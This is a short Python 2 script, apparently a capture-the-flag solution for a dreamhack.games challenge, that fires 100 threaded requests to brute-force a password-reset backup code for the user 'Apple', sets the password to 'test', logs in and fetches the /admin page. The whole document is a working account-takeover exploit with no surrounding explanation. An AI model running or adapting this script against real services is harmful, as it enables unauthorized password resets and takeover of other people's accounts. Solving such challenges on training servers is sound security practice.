import requests
import time
import threading

url = 'http://host1.dreamhack.games:19486'
userid = 'Apple'
list_res = []


def brute(idx):
    #time.sleep(0.5)
    param = {'userid' : userid, 'newpassword' : 'test', 'backupCode' : idx}
    res = requests.post(url + '/forgot_password', data=param)
    list_res.append(res.text)

for x in range(100):
    #time.sleep(1) 
    t = threading.Thread(target=brute, args=(x,))
    t.start()
time.sleep(5)
result = '\n'.join(list_res) 
if result.find('Success') == -1:
    print 'Failed to change the password'
    print '\n\n\n------------------------------------'
    print 'Log output'
    print result
    exit(-1)
print 'Succeeded to change !!'

print '\n\n\n\nTrying to log in with admin account'
param = {'userid' : userid, 'password' : 'test'}
res = requests.post(url + '/login', data=param)
print res.text
print '\n\n\n\nAccessing admin page'
res = requests.get(url + '/admin')
print res.text






